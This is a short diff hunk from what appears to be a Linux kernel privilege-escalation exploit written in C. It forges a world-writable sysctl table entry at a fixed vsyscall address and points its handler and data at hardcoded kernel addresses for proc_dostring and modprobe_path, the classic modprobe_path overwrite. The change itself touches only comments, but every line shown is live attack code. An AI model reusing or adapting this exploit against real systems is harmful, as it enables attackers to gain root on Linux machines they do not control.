@@ -144,8 +144,8 @@ int main(int argc, char **argv)
     memcpy((char *)(VSYSCALL+0xe00),"\x01\x00\x00\x00",4);
     c->procname = (char *)(VSYSCALL+0xf00);
     c->mode = 0666;
-    c->proc_handler = (void *)0xffffffffaa083310; //(off->proc_dostring);
-    c->data = (void *)0xffffffffaae553c0; //(off->modprobe_path);
+    c->proc_handler = (void *)0xffffffffaa083310; //(proc_dostring());
+    c->data = (void *)0xffffffffaae553c0; //(modprobe_path());
     c->maxlen=256;
     c->extra1 = (void *)(VSYSCALL+0xe00);
     c->extra2 = (void *)(VSYSCALL+0xd00);
